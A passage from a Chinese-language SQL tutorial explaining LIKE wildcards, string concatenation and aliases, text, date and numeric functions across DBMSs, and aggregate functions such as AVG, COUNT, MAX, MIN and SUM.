<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">LIKE</span> <span class="token string">'Foo%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>如果使用微软的 Access 数据库应使用*通配符而不是%；</p>
</li>
<li><p>根据 DBMS 的不同与配置，搜索是可以区分大小写的；</p>
</li>
<li><p>通配符可以在搜索模式中的任意位置使用，并且可以使用多个通配符；</p>
</li>
<li><p>%还能匹配 0 个字符，所以%代表的其实是搜索模式中给定的 0 个、1 个或多个字符；</p>
</li>
<li><p>包括 Access 在内的许多 DBMS 都用空格来填补字段的内容，如果某列有 50 个字符，而存储的文本仅 17 个字符，为填满该列需要在文本后加 33 个空格，这样做对数据及其使用没有影响，但对通配符的 SQL 子句有影响，例如 WHERE column1 LIKE ‘Foo%Bar’只能匹配以 Foo 开头以 Bar 结尾的 column1，但补了空格后就不再是以 Bar 结尾，而是以空格结尾，就无法通过前面的子句搜索出’Foo hello Bar’这样的数据了。解决办法是给 Bar 后再加一个%匹配，匹配 Bar 后的空格。更好的方法是用函数去掉空格，后面会讲；</p>
</li>
<li><p>通配符%看起来可以匹配任何东西，但是 null 不会被匹配。WHERE column1 LIKE ‘%’不会匹配 column1 为 null 的行。</p>
</li>
</ol>
<h3 id="下划线（-）通配符"><a href="#下划线（-）通配符" class="headerlink" title="下划线（_）通配符"></a>下划线（_）通配符</h3><p>下划线通配符 (_) 与 (%) 用途一样，但只匹配单个字符。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 找到column1列所有以Foo开头且Foo后只有一个字符的值</span>
<span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">LIKE</span> <span class="token string">'Foo_'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>DB2 不支持 (_)；</p>
</li>
<li><p>Microsoft Access 使用 (?) 而不是 (_)。</p>
</li>
</ol>
<h3 id="方括号-通配符"><a href="#方括号-通配符" class="headerlink" title="方括号 ([]) 通配符"></a>方括号 ([]) 通配符</h3><p>方括号通配符 ([]) 指定一个字符集合，匹配该通配符所在位置的单个字符。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 找到column1列所有以F或B开头的值</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">LIKE</span> <span class="token string">'[FB]%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>只有微软的 Access 和 SQL Server 支持集合通配符；</p>
</li>
<li><p>([]) 通配符内可以用 (^) 来否定，这有点像正则表达式的语法，如[^fb]表示匹配所有不是 F 或 B 的值；</p>
</li>
<li><p>在 Microsoft Access 中要用 (!) 而不是 (^) 来表示否定，如[!FB]；</p>
</li>
<li><p>也可以使用 NOT 操作符得到类似的效果，但 (^) 的优点是使用多个 WHERE 子句时能简化语法，如下：</p>
</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 使用NOT操作符实现 (^) 相同的效果</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> <span class="token operator">NOT</span> column1 <span class="token operator">LIKE</span> <span class="token string">'[FB]%'</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>通配符使用技巧：</p>
<p>通配符很有用，但是有代价的，因为通配符的搜索通常比其他搜索耗费更长的处理时间。</p>
<ol>
<li><p>不过度使用通配符，其他操作符能达到目的，应尽量使用其他操作符；</p>
</li>
<li><p>确实需要使用通配符时，尽量不要用在搜索模式的开始，因为这样搜索是最慢的。</p>
</li>
</ol>
<h2 id="创建计算字段"><a href="#创建计算字段" class="headerlink" title="创建计算字段"></a>创建计算字段</h2><p>字段 Field 基本上与列 column 的意思相同，经常互换使用。一般数据库列称为列，字段则与计算字段一起使用。</p>
<p>只有数据库知道 SELECT 语句中哪些列是实际的表列，哪些列是计算字段，对于客户端来看计算字段与其他表列的数据返回方式相同。</p>
<h3 id="拼接字段"><a href="#拼接字段" class="headerlink" title="拼接字段"></a>拼接字段</h3><p>拼接 (concatenate) 是指将多个值联结到一起形成一个单值。在 Access 与 SQL Server 中使用 (+) 作为拼接操作符，DB2、Oracle、PostgreSQL、SQLite、Open Office Base 使用 (||) 作为拼接操作符，MySQL、MariaDB 中则必需使用特殊的函数。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Access、SQL Server</span>
<span class="token keyword">SELECT</span> column1 <span class="token operator">+</span> <span class="token string">'('</span> <span class="token operator">+</span> column2 <span class="token operator">+</span> <span class="token string">')'</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span>
<span class="token comment">-- DB2、Oracle、PostgreSQL、SQLite、Open Office Base</span>
<span class="token keyword">SELECT</span> column1 <span class="token operator">||</span> <span class="token string">'('</span> <span class="token operator">||</span> column2 <span class="token operator">||</span> <span class="token string">')'</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span>
<span class="token comment">-- MySQL、MariaDB</span>
<span class="token keyword">SELECT</span> Concat<span class="token punctuation">(</span>column1<span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于数据库中通常会用空格填充字段剩余长度，因此上面的 SQL 语句执行结果通常如下：</p>
<p>FOO BAR (FOO BAR )</p>
<p>此时应该使用 SQL 中的 RTRIM()函数，去除字段右侧的多余空格</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Access、SQL Server</span>
<span class="token keyword">SELECT</span> RTRIM<span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' ('</span> <span class="token operator">+</span> RTRIM<span class="token punctuation">(</span>column2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span>
<span class="token comment">-- DB2、Oracle、PostgreSQL、SQLite、Open Office Base</span>
<span class="token keyword">SELECT</span> RTRIM<span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">' ('</span> <span class="token operator">||</span> RTRIM<span class="token punctuation">(</span>column2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">')'</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span>
<span class="token comment">-- MySQL、MariaDB</span>
<span class="token keyword">SELECT</span> Concat<span class="token punctuation">(</span>column1<span class="token punctuation">,</span> <span class="token string">' ('</span><span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>TRIM 函数<br>LTRIM() 去除字符串左边的空格<br>RTRIM() 去除字符串右边的空格<br>TRIM() 去除字符 串两边的空格</p>
</blockquote>
<p>现在我们得到了新的计算列，但它现在还没有名字，它只是一个值，若我们仅在 SQL 查询工具中查看已经没有问题了，但是未命名的列不能用于客户端应用中，因为客户端无法引用它。此时我们要使用别名来使客户端能够引用。</p>
<p>别名（alias）是一个字段或值的替换名，别名用关键字 AS 赋予。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Access、SQL Server</span>
<span class="token keyword">SELECT</span> RTRIM<span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' ('</span> <span class="token operator">+</span> RTRIM<span class="token punctuation">(</span>column2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span> <span class="token keyword">AS</span> column1_column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span>
<span class="token comment">-- DB2、Oracle、PostgreSQL、SQLite、Open Office Base</span>
<span class="token keyword">SELECT</span> RTRIM<span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">' ('</span> <span class="token operator">||</span> RTRIM<span class="token punctuation">(</span>column2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">')'</span> <span class="token keyword">AS</span> column1_column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span>
<span class="token comment">-- MySQL、MariaDB</span>
<span class="token keyword">SELECT</span> Concat<span class="token punctuation">(</span>column1<span class="token punctuation">,</span> <span class="token string">' ('</span><span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> column1_column2 <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意：别名可以是单词也可以是字符串，若是字符串则应该括在引号中，虽然使用字符串是合法的，但不建议使用字符串。别名有时也称为导出列（derived column）。</p>
<h3 id="执行算术计算"><a href="#执行算术计算" class="headerlink" title="执行算术计算"></a>执行算术计算</h3><p>SQL 支持基本的操作符</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加</td>
</tr>
<tr>
<td>-</td>
<td>减</td>
</tr>
<tr>
<td>*</td>
<td>乘</td>
</tr>
<tr>
<td>/</td>
<td>除</td>
</tr>
</tbody></table>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column1<span class="token operator">*</span>column2 <span class="token keyword">AS</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>测试计算<br>SELECT 语句为测试、检验函数、计算提供了很好的方法。<br>虽然 SELECT 通常用于从表中检索数据，但是省略了 FROM 子句后就是简单的访问和处理表达式。<br>例如 SELECT 3 * 2 返回 6，SELECT TRIM(‘ abc ‘)返回 abc，SELECT Now()，返回当前日期和时间。</p>
</blockquote>
<h2 id="使用函数处理数据"><a href="#使用函数处理数据" class="headerlink" title="使用函数处理数据"></a>使用函数处理数据</h2><h3 id="SQL-函数的优点与局限"><a href="#SQL-函数的优点与局限" class="headerlink" title="SQL 函数的优点与局限"></a>SQL 函数的优点与局限</h3><p>SQL 中的函数为数据的转换和处理提供了方便，但是只有少数几个函数被所有主要的 DBMS 等同地支持。虽然所有类型的函数一般都可以在每个 DBMS 中使用，但各个函数的名称和语法可能不尽相同。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
</tr>
</thead>
<tbody><tr>
<td>提取部分字符串</td>
<td>Access 使用 MID()；DB2、Oracle、PostgreSQL 和 SQLite 使用 SUBSTR()；MySQL 和 SQL Server 使用 SUBSTRING()</td>
</tr>
<tr>
<td>数据类型转换</td>
<td>Access 和 Oracle 使用多个函数，每种类型的转换有一个函数；DB2 和 PostgreSQL 使用 CAST()；MariaDB、MySQL 和 SQL Server 使用 CONVERT()</td>
</tr>
<tr>
<td>获取当前日期</td>
<td>Access 使用 NOW()；DB2 和 PostgreSQL 使用 CURRENT_DATE；MariaDB 和 MySQL 使用 CURDATE()；Oracle 使用 SYSDATE；SQL Server 使用 GETDATE()；SQLite 使用 DATE()</td>
</tr>
</tbody></table>
<p>可见，SQL 函数与 SQL 语句不一样，SQL 函数不是可移植的，这意味着为特定 SQL 实现编写的代码在其他实现中可能不正常。</p>
<h3 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h3><p>大多数 SQL 实现支持以下类型函数</p>
<ul>
<li><p>用于处理文本字符串（如删除或填充值，转换值为大写或小写）的文本函数</p>
</li>
<li><p>用于在数值数据上进行算数操作（如返回绝对值，进行代数运算）的数值函数</p>
</li>
<li><p>用于处理日期和时间值并从这些值中提取特定成分（如返回两个日期之差，检查日期有效性）的日期和时间函数。</p>
</li>
<li><p>返回 DBMS 正使用的特殊信息（如返回用户登录信息）的系统函数</p>
</li>
</ul>
<h4 id="文本处理函数"><a href="#文本处理函数" class="headerlink" title="文本处理函数"></a>文本处理函数</h4><p>UPPER() 函数将文本转换为大写</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> UPPER<span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> column1_upcase <span class="token keyword">FROM</span> table1 <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>常用文本处理函数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>LEFT() （或使用子字符串函数）</td>
<td>返回字符串左边的字符</td>
</tr>
<tr>
<td>LENGTH() （也使用 DATALENGTH()或 LEN()）</td>
<td>返回字符串的长度</td>
</tr>
<tr>
<td>LOWER() （Access 使用 LCASE()）</td>
<td>将字符串转为小写</td>
</tr>
<tr>
<td>LTRIM()</td>
<td>去掉字符串左边的空格</td>
</tr>
<tr>
<td>RIGHT() （或使用子字符串函数）</td>
<td>返回字符串右边的字符</td>
</tr>
<tr>
<td>RTRIM()</td>
<td>去掉字符串右边的空格</td>
</tr>
<tr>
<td>SOUNDEX()</td>
<td>返回字符串的 SOUNDEX 值</td>
</tr>
<tr>
<td>UPPER() （Access 使用 UCASE()）</td>
<td>将字符串转换为大写</td>
</tr>
</tbody></table>
<p>SOUNDEX 是一个将任何文本字符串转换为描述其语音表示的字母数字模式的算法。SOUNDEX 考虑了类似的发音和音节，使得能对字符串进行发音比较而不是字母比较。多数 DBMS 提供对 SOUNDEX 的支持（Access 和 PostgreSQL 不支持 SOUNDEX()，SQLite 需要在编译时选择支持 SOUNDEX 否则默认不支持）</p>
<p>若数据库中有个人名为 Michelle Green 但这是错误的输入，正确的名字为 Michael Green，此时用 Michael Green 就不会返回数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'Michael Green'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时使用 SOUNDEX 函数搜索，它将匹配所有发音类似于 Michael Green 的名字，就能检索出 Michelle Green</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> SOUNDEX<span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token operator">=</span> SOUNDEX<span class="token punctuation">(</span><span class="token string">'Michael Green'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="日期和时间处理函数"><a href="#日期和时间处理函数" class="headerlink" title="日期和时间处理函数"></a>日期和时间处理函数</h4><p>日期时间函数在 SQL 中具有重要作用，但它们很不一致，可移植性最差。</p>
<p>找出 2012 年的所有数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- SQL Server</span>
<span class="token comment">-- DATEPART() 返回日期的某一部分，参数为要返回的部分与日期</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> DATEPART<span class="token punctuation">(</span>yy<span class="token punctuation">,</span> column_date<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">2012</span><span class="token punctuation">;</span>
<span class="token comment">-- Access</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> DATEPART<span class="token punctuation">(</span><span class="token string">'yyyy'</span><span class="token punctuation">,</span> column_date<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">2012</span><span class="token punctuation">;</span>
<span class="token comment">-- PostgreSQL</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> DATE_PART<span class="token punctuation">(</span><span class="token string">'year'</span><span class="token punctuation">,</span> column_date<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">2012</span><span class="token punctuation">;</span>
<span class="token comment">-- Oracle</span>
<span class="token comment">-- to_char函数提取部分日期，to_number函数将值转换为数字类型</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> to_number<span class="token punctuation">(</span>to_char<span class="token punctuation">(</span>column_date<span class="token punctuation">,</span> <span class="token string">'YYYY'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">2012</span><span class="token punctuation">;</span>
<span class="token comment">-- 也可使用BETWEEN操作符</span>
<span class="token comment">-- to_date函数将字符串转为日期</span>
<span class="token comment">-- SQL Server中使用CONVERT函数替换to_date函数</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column_date <span class="token operator">BETWEEN</span> to_date<span class="token punctuation">(</span><span class="token string">'01-01-2012'</span><span class="token punctuation">)</span> <span class="token operator">AND</span> to_date<span class="token punctuation">(</span><span class="token string">'12-31-2012'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- MySQL、MariaDB</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> <span class="token keyword">YEAR</span><span class="token punctuation">(</span>column_date<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">2012</span><span class="token punctuation">;</span>
<span class="token comment">-- SQLite</span>
<span class="token keyword">SELECT</span> column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> strftime<span class="token punctuation">(</span><span class="token string">'%Y'</span><span class="token punctuation">,</span> column_date<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'2012'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="数值处理函数"><a href="#数值处理函数" class="headerlink" title="数值处理函数"></a>数值处理函数</h4><p>数值处理函数仅处理数据，一般主要用于代数、三角或几何运算，数值函数在主要 DBMS 函数中最统一。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>ABS()</td>
<td>返回一个数的绝对值</td>
</tr>
<tr>
<td>COS()</td>
<td>返回一个角度的余弦</td>
</tr>
<tr>
<td>EXP()</td>
<td>返回一个数的指数值</td>
</tr>
<tr>
<td>PI()</td>
<td>返回圆周率</td>
</tr>
<tr>
<td>SIN()</td>
<td>返回一个角度的正弦</td>
</tr>
<tr>
<td>SQRT()</td>
<td>返回一个数的平方根</td>
</tr>
<tr>
<td>TAN()</td>
<td>返回一个角度的正切</td>
</tr>
</tbody></table>
<h2 id="汇总数据"><a href="#汇总数据" class="headerlink" title="汇总数据"></a>汇总数据</h2><h3 id="聚集函数"><a href="#聚集函数" class="headerlink" title="聚集函数"></a>聚集函数</h3><p>我们常需要汇总数据而不需要把它们实际检索出来，例如：</p>
<ul>
<li><p>确定表中行数（或者满足某个条件或包含某个特定值的行数）</p>
</li>
<li><p>获得表中某些行的和</p>
</li>
<li><p>找出表列（所有行或某些特定行）的最大值、最小值、平均值</p>
</li>
</ul>
<p>SQL 给出五个聚集函数，SQL 的聚集函数在各主要 SQL 实现中得到了相当一致的支持。这些函数很高效，返回结果要比自己在客户端中自己实现要快得多。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>AVG()</td>
<td>返回某列的平均值</td>
</tr>
<tr>
<td>COUNT()</td>
<td>返回某列的行数</td>
</tr>
<tr>
<td>MAX()</td>
<td>返回某列的最大值</td>
</tr>
<tr>
<td>MIN()</td>
<td>返回某列的最小值</td>
</tr>
<tr>
<td>SUM()</td>
<td>返回某列值之和</td>
</tr>
</tbody></table>
<h4 id="AVG-函数"><a href="#AVG-函数" class="headerlink" title="AVG 函数"></a>AVG 函数</h4><p>AVG 通过对表中行数计数并计算其列值之和，求得该列的平均值。AVG 可以用来返回所有列的平均值，也可以用来返回特定列或行的平均值。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 返回所有行的平均值</span>
<span class="token keyword">SELECT</span> <span class="token function">AVG</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> avg_column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span>
<span class="token comment">-- 返回特定行的平均值</span>
<span class="token keyword">SELECT</span> <span class="token function">AVG</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> avg_column1 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column2 <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>注意：<strong>AVG 只用于固定列</strong><br>AVG 函数只能用来确定特定数值列的平均值，而且列名必需作为函数参数给出。为了获得多个列的平均值，必须使用多个 AVG 函数</p>
<p>说明：<strong>NULL 值</strong><br>AVG 函数忽略列值为 NULL 的行</p>
</blockquote>
<h4 id="COUNT-函数"><a href="#COUNT-函数" class="headerlink" title="COUNT 函数"></a>COUNT 函数</h4><p>COUNT 函数进行计数，确定表中行的数目或符合特定条件的行的数目。</p>
<p>COUNT 函数有两种使用方式：</p>
<ol>
<li>使用 COUNT(*)对表中行的数目进行计数，不管表列中包含的是空值（NULL）还是非空值。</li>
<li>使用 COUNT(column)对特定列中具有值的行进行计数，忽略 NULL 值的行。</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 所有行，包括空值</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> num_table1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span>
<span class="token comment">-- 特定列，不含空值</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> num_column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="MAX-函数"><a href="#MAX-函数" class="headerlink" title="MAX 函数"></a>MAX 函数</h4><p>MAX 函数返回指定列中的最大值，<strong>MAX 要求指定列名</strong>。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> max_column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>提示：<strong>对非数值数据使用 MAX</strong><br>虽然 MAX 函数一般用来找出最大的数值或日期值，但许多（并非所有）DBMS 允许将它用来返回任意列中的最大值，包括返回文本列中的最大值。在用于文本数据时，MAX 函数返回按列排序后的最后一行</p>
<p>说明： <strong>NULL 值</strong><br>MAX 函数总是忽略值为 NULL 的行</p>
</blockquote>
<h4 id="MIN-函数"><a href="#MIN-函数" class="headerlink" title="MIN 函数"></a>MIN 函数</h4><p>MIN 函数返回指定列的最小值，<strong>MIN 要求指定列名</strong>。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">MIN</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> min_column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>提示：<strong>对非数值数据使用 MIN</strong><br>虽然 MIN 函数一般用来找出最小的数值或日期值，但许多（并非所有）DBMS 允许将它用来返回任意列中的最小值，包括返回文本列中的最小值。在用于文本数据时，MIN 函数返回按列排序后的第一行</p>
<p>说明： <strong>NULL 值</strong><br>MIN 函数总是忽略值为 NULL 的行</p>
</blockquote>
<h4 id="SUM-函数"><a href="#SUM-函数" class="headerlink" title="SUM 函数"></a>SUM 函数</h4><p>SUM 函数用来返回指定列值的和。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 合计值</span>
<span class="token keyword">SELECT</span> <span class="token function">SUM</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> sum_column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span>
<span class="token comment">-- 合计计算值</span>
<span class="token keyword">SELECT</span> <span class="token function">SUM</span><span class="token punctuation">(</span>column1 <span class="token operator">*</span> column2<span class="token punctuation">)</span> <span class="token keyword">AS</span> multi_column <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>提示：<strong>在多个列上进行计算</strong><br>所有聚集函数都可以用来执行多个列上的计算</p>
<p>说明：<strong>NULL 值</strong><br>SUM 函数忽略值为 NULL 的行</p>
</blockquote>
<h3 id="聚集不重复值"><a href="#聚集不重复值" class="headerlink" title="聚集不重复值"></a>聚集不重复值</h3><p>以上五个函数都可以如下使用：</p>
<ol>
<li><p>对所有行执行计算，指定 ALL 参数或不指定参数（因为 ALL 是默认行为）</p>
</li>
<li><p>只包含不重复值，指定 DISTINCT 参数</p>
</li>
</ol>
<p>说明：<strong>不要在 Access 中使用</strong></p>
<p>Microsoft Access 在聚集函数中不支持 DISTINCT（下面的例子不适用），要在 Access 中得到类似结果，需要使用子查询把 DISTINCT 数据返回到外部的 SELECT COUNT(*)语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 使用DISTINCT后得到的平均值可能偏高或偏低，因为当多个行有相同数据时，排除重复数据时会改变平均值</span>
<span class="token keyword">SELECT</span> <span class="token function">AVG</span><span class="token punctuation">(</span><span class="token keyword">DISTINCT</span> column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> avg_column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>**DISTINCT 不能用于 COUNT(*)**，DISTINCT 在 COUNT 中必须使用列名，不能用于计算或表达式</p>
</li>
<li><p><strong>将 DISTINCT 用于 MAX 与 MIN 函数没有意义</strong>，DISTINCT 从技术上可以用于 MIN 和 MAX 函数，但最大最小值不会考虑重复值，结果都是相同的</p>
</li>
<li><p><strong>其他聚集参数</strong>，有的 DBMS 还支持其他参数，如支持对查询结果的子集进行计算的 TOP 和 TOP PERCENT。</p>
</li>
</ol>
<h3 id="组合聚集函数"><a href="#组合聚集函数" class="headerlink" title="组合聚集函数"></a>组合聚集函数</h3><p>上述例子都只涉及单个函数，实际上，SELECT 语句可根据需要包括多个聚集函数。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> num_column<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> min_column1<span class="token punctuation">,</span> <span class="token function">MAX</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> max_column1<span class="token punctuation">,</span> <span class="token function">AVG</span><span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token keyword">AS</span> avg_column1 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：指定聚集函数结果的别名时，不应该使用表中实际的列名。这样做虽然合法，但许多 SQL 实现不支持，可能会产生错误信息。</p>
